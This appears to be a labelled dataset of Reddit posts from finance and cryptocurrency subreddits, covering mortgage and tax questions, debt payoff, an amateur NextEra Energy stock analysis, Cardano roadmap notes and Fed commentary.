And these ones don't perform particularly well in my algorithm, but I thought it would be worthwhile to mention them within this ecological niche:

* DEGO (high price for this project, but I think it has the best room for moving up the market rankings in the DeFi space, plus they emphasize sustainability and probably have the coolest website)

* GET (one of the most promising blockchain use cases, it's one where I really can't see how it fails.  I would prefer to buy limited supply cryptos though, and I'd be wary of the Mark Cuban pumps just because they overshoot high and then tend to drop down to reality)

* SOLVE (really interesting project token for healthcare.  Another one that has too low of volume for me to get super excited about and the socials are pretty much nonexistent as you'd might expect in this case)

We'll see how things go for another two months.  It's easy to ride waves, but it takes a tremendous amount of effort to identify and stay ahead of the wave that isn't visible yet.",cryptocurrency
personalfinance,"I know, I should probably ask the lender, but bear with me, please...","Our soon to be mortgage lender has proposed 2 payment plan for our refinance. One is to pay monthly with a 3.357 interest rate and bi-weekly with a 3.25 interest rate...... this may be hard for you to explain, especially for someone like me to understand it, and because I am not confident I will word the question well, but here goes anyway:  


Is it that our interest rate really is lower with the bi-weekly option or is it that the only reason she's saying ""2.25"" is because the fact that we paid bi-weekly (one extra mortgage payment a year), our loan will have been as if we had a 2.25 interest rate with the monthly monthly payment.

personalfinance,How do I straighten out my wife's federal tax withholdings?,"TLDR - Looking for W-4 withholding advice when husband and wife have substantially lopsided incomes.

My wife got a new job last year working at a hospital in a ""per diem"" capacity, meaning that her schedule is quite varied - some weeks one day, some weeks three days, sometimes overtime.  We've been very happy with it so far.

Until the W2's came out and I started doing the taxes. Her federal tax withholdings came out to be less than 1% (i.e she made about $15000 and paid just over $100 in fed taxes the whole year).  Which might have been fine if she was filing single, but married filing jointly just ended up looking like an extra fifteen grand that we'd paid nearly zero taxes on. I didn't even know it could go that low.

I went back and looked at her paychecks - probably something we should have been paying closer attention to all year, I'll grant you that, but we live almost entirely on my salary and whatever she brings in is extra, so we've generally just taken a ""whatever you take home is a bonus"" strategy. What I found was that for the weeks she earned less than about $800, literally no federal tax is withheld. For weeks when she made more than that, a small amount is deducted, always less than about 3%.

We'd like to change that. But I don't know, to what? I don't even know the terminology - do we both behave like we've both got dependents to worry about? She's not supporting them on her paycheck, I am. Our incomes are so lopsided - my paycheck represents probably 80% of our total income for the year? While she's got a couple of part time jobs that make up the rest. So on the one hand there's no sense in her killing herself working multiple jobs just for 40% of it to be taken out in taxes, we would definitely prefer to have that money come home each week in her paycheck. But, I don't want to take that to the extreme where we pay for it at the end of the year, does that make sense?

At the end of the day I realize that the taxes are what they are, and if we made X total dollars we need to pay Y federal tax. I'm just trying to spread it out more throughout the year so doing the actual tax return doesn't give me an ulcer wondering why I suddenly owe a few thousand dollars out of nowhere.",finance

Bitcoin,How to correctly argue the inferiority of altcoins,"I've spent just as long arguing against altcoins as there have been altcoins. I remember pointing out how peercoin was a joke on Bitcointalk years before ethereum was even a twinkle in Vitalik's commie eye. Sure, I was probably just 'pumping my bag' at the beginning, but I was learning. Reading Saifedean's ""The Bitcoin Standard"" helped me put it into greater perspective too, but there isn't another argument that forces altcoiners to think about bitcoin in terms of good and evil. This is how you win hearts and minds, folks. 

Printing money is one of the true evils of this world. You might even call central banking the root of all modern evil. No one, not even governments fairly elected by the people, should hold that much power. It always leads to inflationary printing to buy things you won't approve of such as the military industrial complex, the prison industrial complex, and the surveillance state. (To name a few) Before fiat printing was done a war had to be financed by taxing its people, which is always unpopular and leads to tiny wars no bigger than a border dispute.

Bitcoin was invented to remove the central position of power over money. No government can take it over, not with all the armies of the world at their disposal. There are several reasons bitcoin is special in this regard, from holding the majority of PoW hashing power to Satoshi's disappearance.  There really is no person, company, or small group of people that can be held at gunpoint to harm bitcoin in any serious way. Can Any altcoin say this?  Not truthfully. Bitcoin's genesis was very unique.

Any amount of wealth invested in an altcoin could have been used to grow bitcoin instead. This only helps support evil in the grand scheme of things. Ergo, altcoins are evil.",cryptocurrency
personalfinance,Wondering if I made a mistake on my first house.,"Closing on our first house next week.  We got an 80-10-10 loan to avoid PMI.  Purchase price was 640k and we put 64k down plus closing costs the got a second mortgage for 64k the primary wound up being 512k.  I think the lender was trying to avoid jumbo financing.  Anyway the mortgage is affordable for us I calculated it would be 18% of me and my fiancé gross income.  My thoughts were interest rates are going up and I didn't want to risk trying to refinance down the road to remove PMI, so with the second mortgage we can just pay that off in a few years on not worry about the risk of rates going up significantly.  I wanted to just do 20% but in my area prices have been going up 10-15% for the last 5 years and it just felt like we couldn't save faster than prices were going up.

personalfinance,"What to do with $3,000","Hey everyone, so I am trying to figure out what to do with $3,000. Currently it’s in a savings account that has a 0.05% interest rate. I’ve been trying to figure out if I should move it to another account where there’s better interest or look to the stocks to invest it somewhere. Any advice?

**adding more info...So really due to some family things and my savings I have around $70,000 savings that is not my income, 401K, or emergency fund. It’s split to $50,000 for education that I am trying to move to make better interest since I’ll be utilizing that chunk for payments in that department, I’m too nervous to invest that much and would rather figure out a savings account plan there. Then the $20,000 is being added into monthly and I would say the planned split is $10,000 my portion of house down payment, $7,000 for wedding/reception/honeymoon (this potentially will be less depending on our game plan), and the remaining $3,000 I’m wondering what to do with. Truly I want to put it all in a new savings account to gain interest for the next few years before I use parts of it, but I have no clue where. Someone mentioned T-Mobil Money, 4% APY up to 3,000 and 1% after that when perks are signed up for and 10 purchases per month? 

TLDR: I have $70,000 i want to move to a savings account that’s better than %0.05 interest rate. What savings account should I do? $3,000ish I don’t immediately need now and I already have an emergency fund, keep it with the rest in savings or invest but then invest in what?",finance

personalfinance,Could CDs be a good way to save money for taxes?,"High Yield CDs are pretty much guaranteed and I don't like the idea of not accounting for taxes in my monthly expenses and also having that money sit doing nothing (or doing last minute saving to pay for taxes). So I was wondering if it would be beneficial to make a ladder of 12 CDs (or more) so that my monthly ""tax payments/investments"" will be in CDs that all mature in early April or late May before I pay my taxes, so that I can account for it at the end of each month and have a safe investment with higher returns than a high yield savings account to pay for my taxes. I imagine I'd have to have the months closer to the IRS deadline loop and mature into the next year to retain that higher interest rate. But in theory, I'd be investing more and earlier so my money could do work before it has to go to the government and I could save/invest/spend the accrued interest after paying the government's share.

I imagine the first six months after the tax deadline would pay for the upcoming tax payment, but the 6 months prior should be saving for the one after (or maybe there is some better way to balance that or maybe each CD should run for longer than 6 months). Would this be a good idea? Or would the marginally higher interest rate than a high yield savings account not be worth my time?",finance

stocks,Resubmitting my NEE DD with hopefully better formatting,"Before continuing I feel like I should make clear that I am not a financial expert nor am I an expert on the stock market in general, I am just an average investor who likes to listen to Earnings Reports and stock reviews on his hour long commute to work each day M-F. I don’t have any special insider info, just what I can Google and I do not currently hold any positions of NEE but plan to buy a decent amount of shares proportionally to the rest of my portfolio after the purchase of a new car that I am saving for.  Ideally I’ll be buying and adding to my initial investment within 2 months as I’m expecting to only have to save up for another month and a half until I can buy the new car I am looking at. I’m also planning to add $100 every paycheck to my Roth during this period of saving for my car so that could also turn into a few shares of NEE before my planned larger initial buy. 

NextEra Energy Inc (ticker symbol NYSE: NEE) is the world largest utility company and is composed of three subsidies, Florida Power and Light (FPL), Gulf Energies, and NextEra Energy Resources LLC, which, combined with its affiliated entities, is the worlds largest green energy supplier/generator or solar and wind energy, well earning it the title of Supermajor. Traditionally the title of Supermajor is reserved for the largest players in the oil and gas industries since those companies control the energy that powers modern civilization, oil. However due the recent drop in cost to build and maintain renewable energy generation along with a larger than anticipated federal backing, renewables have lead to a new wave of energy Supermajors rolling in, and NextEra is leading the charge. Not just in the US, but globally as well. In this DD I am going to attempt to go over some basic financial information as well as some upcoming and past events that I see as growth opportunities and how those all pertain to NEE’s potential to be a long term dividend growth company that I feel deserves a spot in any investors portfolio if their time horizon is 30 years plus like mine is with my Roth IRA. (I am currently 23, so I can’t touch my tax free earnings for another 36 years, but that’s okay because I’m that time I’m expecting an avalanche of snowballs to occur if I’m successful in picking my portfolio.)

NEE pays a dividend traditionally in the months of March, June, September, and December. NEE stock is operating with a current share price of $77.94 and a current dividend FY 2021 dividend payment of $1.55 with a yield of 1.98%, down from their 4 year average of 2.78% which is itself down from the Utility Sector average of 3.24% suggesting it still has room to grow its dividend as NEE continues to lead the world in green energy generation. This current yield represents an \~10.71% increase from last fiscal years dividend of $1.40. Looking into FY2022 it is expected that the payout will again increase, this time to $1.71 representing another \~10.71% increase YoY.  And while NEE themselves have only offered guidance through 2022, Morningstar Analysts have gone a bit further, and predict NEE to raise its dividend by &gt;10% each year through 2024. While this may seem like a bullish prediction it is important to know that NEE has been increasing its dividend for the last 27 years and has raised its dividend an average of 9.6% each year since 2005 and in the last 5 years alone, it has grown its dividend by over 12.5%. Finally, NEE only has a dividend payout ratio of 61.31%, which explains its dividend safety score of 99 and why analysis expect this dividend to continue to grow. Thanks in part to its share price appreciation but mostly it’s growing dividend, NEE has been able to provide a total return to shareholders of 700% over the last 10 years while the S&amp;P 500 only returned 267% or less than half that of NEE.

Moving away from the dividend financials and looking more broadly at the companies overall holdings one ratio that sticks out to me is the Debt/Equity ratio of 1.32 which suggests that they are financing some of their expansion/growth and expenses by taking on debt. While this might seem like a bad thing, companies, especially utility companies focusing on green and renewable energy, are expected to leverage their debt and take on more debt to expand during this early developmental stage for the industry as a whole. Additionally when compared to its US competitors of Duke Energy ($DUK) and Southern Company ($SO), then NEE actually has a lower D/E ratio since both of them have a ratio of 1.34 and 1.84 respectively. The next question that might naturally come to mind then is “Well if they have a lower D/E ratio does that mean they are growing slower than the other two companies mentioned?” While that is a great concern to have but one that is ultimately not needed. The reason for this is because NextEra has been investing into green and renewable energy for so long and so aggressively that its is now able to funnel some of the profits it is starting to see from those initial investments into growing itself and expanding, thus reducing its need to grab more debt. 

A perfect example of this occurred in 2018 when NextEra Energy Resources finalized a massive deal that saw them acquire 11 new and under construction solar and wind farms that are now starting to become profitable as they were essentially being used to pay for them selves during the first three years NEE owned them per the terms of the contract (it was a 3 year payment period). Luckily time tends to move forward rather predictably and now, 3 years later in 2021 NEE is able to start using the profits from the approximately 1,388 MW (1MW is enough to power 400-900 average American homes for a year) generated from those facilities to finance itself rather than pay for the purchase of those facilities. One such project they are financing is their ‘30-by-30’ plan, where they intend to install at least 30 million active and generating solar panels in Florida alone by 2030. This is an ambitious goal that they believe they can accomplish and when you realize that there are only just over 2 millions solar panels actively in use across all of America, anyone can see the potential upside that being the one to supply all those panels and the energy they generate might bring.  This is an approximate 15X the current number of solar panels in the country, only they expect them to be all in a single state. It’s worth noting that this isn’t even NEE’s only future oriented project, but rather just one that highlights the growth potential NEE has in the long run.  

Another important metric to consider when looking at a company from a dividend growth perspective, is its cash flow. As one might expect from a dividend aristocrat, NEE is cash flow positive and has been increasing its cash flow YoY consistently (while paying down large amounts of debt left and right such as in 2020 when they paid off all their short term debt for that year as well as an additional $5 billion in long term debt) with the exception of 2018 which as previously discussed was a year of large growth and spending, and 2020 which was a global pandemic and even then, NEE was more even with 2019’s cash flow and didn’t really lose any; NEE was cash flow positive for both 2020 and 2018 despite the increased spending or macroeconomic hardships and raised its dividend during each as well. Another thing to note is that it has relatively maintained its operating income proportionally over the years ($4-$5 billion/year) even as its new projects come online and are intergraded into its network. This shows it’s still growing and maintaining it’s expected level of operations at its older sites. 

Another import financial element involved in long term dividend growth investing is a companies Price/Book ratio value. In this case NEE has a P/B ratio of 4.18, significantly higher than the Utility Sectors average of 2.66 currently. I believe there is an explanation for this however, and it has to do with NEE’s heavy investments (spending a lot of money years ago before it was even close to profitable) into renewables and green energy over the years that has caused this higher number. When you compare NEE to Ørsted ($DNNGY), which has a P/B ratio of 4.56 and has been investing into green and renewable energy almost as aggressively and as long as NEE and you can see how the larger renewable utility sector that is focused on growth is trading at a higher P/B ratio than the rest of the Utility Sector in general. 

The final financial metric I am interested in when looking at a dividend growth stock is its P/E ratio, and this is where NEE’s main critique comes into play. NEE’s current P/E ratio is 53, a  bit higher than the industry average of 28 (as of 2019, and 23 as of 2020 when looking at only electric companies) and the average range of 15-25 that its closest US competitors currently occupy. Personally I believe two things can happen because of this higher than average P/E ratio. 

1) Investors eventually believe the stock price is over valued and as a result I believe that the price/share will fall as investors sell off to make a profit before it corrects to a lower P/E. 

\- If this is something you believe would happen but still want to invest for the long term growth than I believe a decent strategy might be to consider dollar cost averaging in until the price starts to trade sideway indicating it’s more or less bottomed out, and when it reaches that point you can buy a majority of your shares than. 

2) Investors don’t believe the stock price is overvalued long enough for NEE to increase its earnings, thus lowering the P/E ratio by making more money as more and more projects are completed and acquisitions start to provide income instead of being used to purely pay for themselves. 

\- Now if this happens to be what you believe to be true then I believe the best course of action would be to open a majority of your position in NEE now and then dollar cost average in as time goes on and taking advantage of any single red days or the market as a whole is down. 

Now personally I believe that a combination of both options will occur where the share price will fall \~14.28% from today’s price to the analysis’ low price target of $66 over the course of a year or so. At the same time however I also expect NEE to increase their earnings by a combination of increasing generation capacity and service area, as well as saving large amounts of money on the costs of harvesting, storing, and transporting solar and wind power which have dropped 70% since 2010 and are continuing to do so. I then expect the price to bounce back if it fell to much, or trade about flat if it corrected just right, around a P/E ratio more in line with its industry, around 15-25. As a result I’m personally planning to buy shares next time it’s time to add to my Utilities Sector in my Roth IRA and continue buying more shares as time goes on. 

The next segment of NextEra that I want to dive into are its upcoming projects, and while I’ve eluded to a few previously in this write up such as their ‘30-by-30’ plan, which actually includes another upcoming community solar project within it called SolarTogether that, when completed, will be the worlds largest solar network of its type. NEE also merged two of its main subsidiaries, Florida Power and Light with Gulf Energy at the start of 2021. 

NextEra Energies ‘30-by-30’ plan is a current project and ongoing investment that is already underway which will generate an additional estimated 10,000 MW/year to their network. Furthermore, within the ‘30-by-30’ plan is a project named SolarTogether, which is estimated to generate 15% of the ‘30-by-30” plans total output or 1,500 MW/year, is a solar community project that, when completed, will be the worlds largest community solar project. SolarTogether will allow customers to offset up to 100% of their electricity use with solar. SolarTogether also allows individuals to sign up to use excess solar energy produced by neighbors when an individual doesn’t have any solar panels on their roof and doesn’t want to pay to install them. This offers a cheaper and greener form of energy that would have been either wasted if the battery for that area was full already or just put into that battery for storage, allowing NEE to make more money off of of what is essentially excess power since it’s only the energy not needed by the original home that collected it. 

The final bit of acquisition/merger news that I feel is pertinent and deserves to be discussed is the merger of NEE’s subsidiaries FPL and Gulf Energy. Under the now single entity, NEE, will officially begin shifting its entire company to a entirely green energy focus. In 2021 it is closing its final coal powered plant and no longer using any coal generated energy while simultaneously pledging to no longer build any combined cycle gas plants and cancelling any ongoing construction on projects not yet completed. This is to keep in line with their company pledge to reduce overall greenhouse gas emissions by 57% by 2029 compared to NEE’s emissions in 2005. In addition, another aspect of NEE’s green energy pledge is to use the merged companies to work on and complete a planned 409 MW solar energy battery. When completed, it will be the world largest solar energy battery but it will still only be a part of NEE’s plan to increase total storage capacity by 1,200 MW by 2029 dramatically increasing their storage capabilities. 

NEE is a utility sector green and renewable energy focused energy provider that currently trades at $77.94, has an analysis target price range of $66 - $101, and an average price target of $87.50. Personally I see NEE’s share price falling no more than \~15% (hitting the analysis low PT of $66) as it’s revenue continues to rise resulting in a reduction to its current P/E ratio sometime this year. Once that happens I expect the price to bounce and return to its expected rate of return of close to 8-9% plus its dividend growth rate averaging 9-12% which could carry the stock back to the APT of $87.50 with occasional spikes and run ups close to $100 this year, and finally passing $100 in 2022.  As such I  planning on buying a few shares when I’m next able to invest and will continue to dollar cost average in regardless of the price as I view this as a truest safe long term 20+ year play that I can sit on and just watch snowball until I’m ready to retire in like 30 years. 

Once again, I am not a financial expert nor am I an expert on the stock market in general, I am just an average investor who likes to listen to Earnings Reports and stock reviews on his hour long commute to work each day M-F. I don’t have any special insider info, just what I can Google and I do not currently hold any positions of NEE but plan to buy a decent amount of shares proportionally to the rest of my portfolio after the purchase of a new car that I am saving for.  Ideally I’ll be buying and adding to my initial investment within 2 months as I’m expecting to only have to save up for another month and a half until I can buy the new car I am looking at. I’m also planning to add $100 every paycheck to my Roth during this period of saving for my car so that could also turn into a few shares of NEE before my planned larger initial buy but I will definitely be opening a position soon with plans to hold it the next 36 years. 

Thank you for reading and I hope you enjoyed this DD that I wrote up for my friends and my discord. Please leave any additional info I might have left out as it pertains to NEE or any other stocks that you like and why. Hopefully this attempt doesn't kill everyone's eyes.",finance
Forex,Covid-19 Spike Slows The US Recovery,"Despite signs of improving output in Europe’s manufacturing sector, German industrial production figures told a different story. The sector contracted by 1.6% against expectations of a rise of 1.5%. Services sectors across Europe appeared weak, not least because of lockdown measures, with the bloc posting the seventh consecutive contraction to 49.6% in March. Once a keystone for the UK economy, the Services sector has been weak, yet there have been recent signs of improvement. New orders climbed in March, resulting in a rise in employment since the pandemic began, moving the sector out of contraction to rise 56.3%.

&amp;#x200B;

Fed Chairman Powell reiterated his concerns about a recovery, in light of the recent rise in Covid-19 infections. He declared that the virus represents more of a concern for the committee than any potential inflationary pressures. If citizens decline vaccinations, another outbreak could curtail an already fragile recovery despite huge stimulus and support from both the Fed and the government. Minutes from the latest FOMC meeting affirmed that no change in policy would take place until ‘substantial further progress’ has been made in key indicators such as employment and inflation. Initial jobless claims spiked unexpectedly to 744,000 in the week ending 3rd April as unemployment remains markedly above pre-pandemic levels.

Japan’s Economy Watchers Survey showed signs of improving sentiment yet at 49% business still remain cautious about future and current economic conditions.

stocks,Jerome Powell Says U.S. Economy Is at an ‘Inflection Point’,"&gt;The economy is at an “inflection point” and on the cusp of growing more quickly, the Federal Reserve chairman, Jerome H. Powell, said in an interview broadcast on Sunday night. But he warned that the crisis was not yet over.  
&gt;  
&gt;Jerome H. Powell, the Federal Reserve chairman, at a news conference in March 2020, as the coronavirus began to cripple the U.S. economy. The outlook is brighter now but not without risks, he said on “60 Minutes” on Sunday night.  
&gt;  
&gt;In the interview, with “60 Minutes” on CBS, Mr. Powell said that the American economy “has brightened substantially” as more people are vaccinated and businesses reopen. But he cautioned that “there really are risks out there,” specifically coronavirus flare-ups, if Americans return to normal life too quickly.  
&gt;  
&gt;“The principal risk to our economy right now really is that the disease would spread again more quickly,” he said. “And that’s troubling. It’s going to be smart if people can continue to socially distance and wear masks.”  
&gt;  
&gt;The Fed has held interest rates near zero since March 2020 and has been buying about $120 billion in government-backed bonds each month, policies meant to stoke spending by keeping borrowing cheap. Fed officials have been clear that they will continue to support the economy until it is closer to their goals of maximum employment and stable inflation — and that while the situation is improving, it is not there yet.  
&gt;  
&gt;Mr. Powell reiterated that approach on Sunday, saying that the central bank would “consider raising rates when the labor market recovery is essentially complete, and we’re back to maximum employment, and inflation is back to our 2 percent goal and is on track to move above 2 percent for some time.”

I also will be paying for about 2-3k for tuition this year, and I think I should get some sort of tax break for that right?

personalfinance,How do I ACTUALLY file a federal tax extension? I'm livid.,"I just wasted an hour on the IRS website and confirming my logins to all the 3 ""majors"" - TaxAct, H&amp;RBlock, and Turbotax. In all 3, I can't for the life of me get to an interface that prepares a 4868. They all just cheerfully begin a full tax return.

More specifically:

[https://www.youtube.com/watch?v=BYWWJeFitj0&amp;t=22s](https://www.youtube.com/watch?v=BYWWJeFitj0&amp;t=22s)

In Turbotax, searching for ""extend"" does not bring up a ""Jump"" option, just a cyclical result to this video.

&amp;#x200B;

In TaxAct, the online resources say to find it under the ""Filing"" tab, but there is no such tab. There's just Taxes, Info, Prefs, Tax Plan, Tax Clac, and ""Start your return now!""

&amp;#x200B;

I don't want to start my 1040, I want to file an extension. If I had the time to properly prepare the return, I wouldn't be looking to file an extension! My CPA is happy to help me, somewhere in June.

At this point, printing and mailing the quarter-page form seems far, far easier than any of the ""free e-file"" services insisting on selling me their wares.

At least TaxAct has a decent estimator that was possible to access, to get to the ballpark for 4868 part II info.",finance

Feel free to make additions as you see fit. Many of your additions from yesterday are in the “Newly Covered” list for today. Also let me know if you think any of the “Previously Covered but Still Interesting” items are no longer interesting and should leave the list.

Let's go....

Newly covered today:

1. Here’s a great way to visualize token minting and other on-chain activities thanks to Smaug. [https://pool.pm/](https://pool.pm/)
2. It looks like the automated NFT maker covered yesterday, actually charges 10 ADA per NFT.  Just an update on the price since it was unknown yesterday.
3. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.  [https://twitter.com/jp\_tattooist/status/1381236949567086592](https://twitter.com/jp_tattooist/status/1381236949567086592) [https://twitter.com/jp\_tattooist/status/1381351429554724875](https://twitter.com/jp_tattooist/status/1381351429554724875)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel.

Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds.

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain!

30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

Forex,COVID-19 Spike Slows The US Recovery,"Despite signs of improving output in Europe’s manufacturing sector, German industrial production figures told a different story. The sector contracted by 1.6% against expectations of a rise of 1.5%. Services sectors across Europe appeared weak, not least because of lockdown measures, with the bloc posting the seventh consecutive contraction to 49.6% in March. Once a keystone for the UK economy, the Services sector has been weak, yet there have been recent signs of improvement. New orders climbed in March, resulting in a rise in employment since the pandemic began, moving the sector out of contraction to rise 56.3%.

Fed Chairman Powell reiterated his concerns about a recovery, in light of the recent rise in Covid-19 infections. He declared that the virus represents more of a concern for the committee than any potential inflationary pressures. If citizens decline vaccinations, another outbreak could curtail an already fragile recovery despite huge stimulus and support from both the Fed and the government. Minutes from the latest FOMC meeting affirmed that no change in policy would take place until ‘substantial further progress’ has been made in key indicators such as employment and inflation. Initial jobless claims spiked unexpectedly to 744,000 in the week ending 3rd April as unemployment remains markedly above pre-pandemic levels.

personalfinance,Wife drowning in Credit Card and Student Loan Debt,"My wife has had a huge debt issues since we got together 6 years ago. It's due to factors like having a low paying but highly demanding job, going to a private graduate school, suffering from depression, indulging in retail therapy, and living in a HCOL area. 


We've talk a lot about this issues throughout our relationship and have tried different methods to mitigate and lower these debts. We've established monthly budgets, used 0% interest balance transfers, starting an income-based repayment plan for student loans, cut back on non-essential shopping and eating out, me taking care of the rent entirely, etc. Unfortunately, these methods haven't really made a dent in the numbers due to interest rates and the fact that she hasn't made herself get a new job. Her current numbers are below:

* Credit Cards: $30K (balances ranging from $500 to 13k with interest rates between 12% and 24%)

* Grad school loans: $59K (she originally took out 50K @7% in 2009 and has been making regular payments ever since. Mix of fed and private )

* Salary: She makes approx $60K gross ($3400 per month) 

* 401K: $48k 
* E-Fund: $500 (I'm basically the E-Fund)

On my side of things:

* Salary: $115K ($5600 per month)

* 401K: $44k
* IRA: $11k
* HSA: $8k
* E-Fund: $8K 

* Credit Cards: 7K @0%
* Student Loans: 5k @0%

We also have 18K in a savings account earmarked for buying a house in the future.

personalfinance,Accelerating home payoff,"Looking for a bit of advice, please.

Most other things are irrelevant about my question - Zero debt, zero payments on anything, outside of my home loan.

Here's the deal...

Bought a new house before selling my old one.

New home loan: 600k, 2 payments plus additional principal made since purchase, 100% financed, 0 down, 2.875%

Old home proceeds: $200k.

&amp;#x200B;

Question: What is the best way to pay off my current $600k loan with that $200k proceeds?  One lump payment to the loan... $1k extra per month on the new loan to principal only and earn interest in a MM account while the account slowly drains? Some other strange ""hack"" where I pay every 15 days?

Re-Fi isn't an option for the next 3 years.

Thanks for any insight.  I learned on my previous house /far/ too late on how to best pay it off - trying to not make the same mistake here, especially with my zero down and (relatively) low-interest rate.",finance

In short, for the past two years we have had to pay money for our federal income taxes. Our tax guy said that this is because my wife's work is not withholding enough taxes.

personalfinance,Retirement Plan and employee contribution question,"I was recently offered a position. The pay is relatively low considering COL.

While looking at the employee benefit, I saw the retirement plan and I wanted to know how this works. In the retirement plan description, it says:

""This plan allows you to make contributions in addition to those made by XXX(Employer) up to the current Federal limits. The maximum voluntary pre-tax and/or Roth after-tax employee contribution amount is $19,500 in 2021. If you are age 50 and over, you may contribute an additional $6,500. Please contact XXXX(company) at **XXXXXXXXXX** if more information is required. Employer contributes 8% when employee contributes 1% of salary up to, and including, $17,500. Above $17,500 of salary, employer contributes 8% when an employee contributes 5% within current legal limits. ""

Does this mean, let's say I contribute 500 a year, then employer will contribute 4000? I wasn't sure if that was right because, from what I've been looking up, that sounds too high. Am I not understanding the statement correctly or is this actually good retirement plan compare to other jobs?

Thank you in advance.

Edit: or it is 8% of my 1% contribution?",finance
Bitcoin,The BitcoinDollar System: what does a bull case future financial system look like?,"Zooming out from the current price action, why is Long Bitcoin the right choice? A price support base for the next phase of adoption is being built right now. In next few years, Bitcoin price will remain volatile, but more is being locked and hodled, reducing supply while demand keeps growing. Number go up.

I’ve been thinking about cash and carry futures arbitrage. Inside US, this is mostly inaccessible except for institutional players. I’ve looked into the regulated options (in the US), but nothing has the liquidity, volume, or borrowing market (leverage) to drive premiums. CME is capital inefficient and contract size only viable for institutions/funds.

However, despite inaccessibility of premium, this trade represents a “synthetic dollar” backed by bitcoin (used as long hedge to short futures). Bitcoin is locked up to serve as collateral, and is sold only to offset the impact of its volatility in Dollar terms.

Real dollar value, in theory, is controlled by central bank to ensure price stability (“CPI”) and reduce unemployment (“encourage businesses to take on debt”).

